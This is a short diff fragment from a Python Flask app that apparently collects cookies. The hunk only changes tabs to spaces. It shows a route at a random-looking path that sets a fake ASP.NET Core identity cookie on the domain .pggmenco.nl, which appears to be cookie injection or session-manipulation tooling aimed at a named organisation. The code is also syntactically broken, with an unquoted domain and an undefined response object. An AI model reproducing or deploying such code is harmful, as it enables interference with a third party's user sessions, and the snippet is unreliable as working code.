@@ -39,11 +39,11 @@ def collect_cookies():
 
 @app.route('/j1ne16xhwld4ir40x2af')
 def setcookies():
-	resp.set_cookie(
+    resp.set_cookie(
     ".AspNetCore.Identity.ApplicationC1",
     value="aaaa",
     max_age=60,
-	path='/',
+    path='/',
     domain=.pggmenco.nl,
     secure=True,
     httponly=True,
